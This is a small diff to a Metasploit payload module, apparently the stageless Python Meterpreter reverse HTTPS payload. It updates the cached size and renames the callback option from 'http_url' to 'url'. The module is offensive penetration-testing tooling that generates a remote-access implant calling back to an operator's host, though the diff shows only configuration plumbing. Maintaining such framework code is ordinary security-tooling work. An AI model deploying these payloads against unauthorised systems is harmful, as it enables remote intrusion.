@@ -12,7 +12,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 51706
+  CachedSize = 51722
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -36,7 +36,7 @@ module MetasploitModule
     opts[:scheme] = 'https'
     opts[:uri_uuid_mode] = :init_connect
     met = stage_meterpreter({
-      http_url:        generate_callback_url(opts),
+      url:             generate_callback_url(opts),
       http_user_agent: opts[:user_agent],
       http_proxy_host: opts[:proxy_host],
       http_proxy_port: opts[:proxy_port]
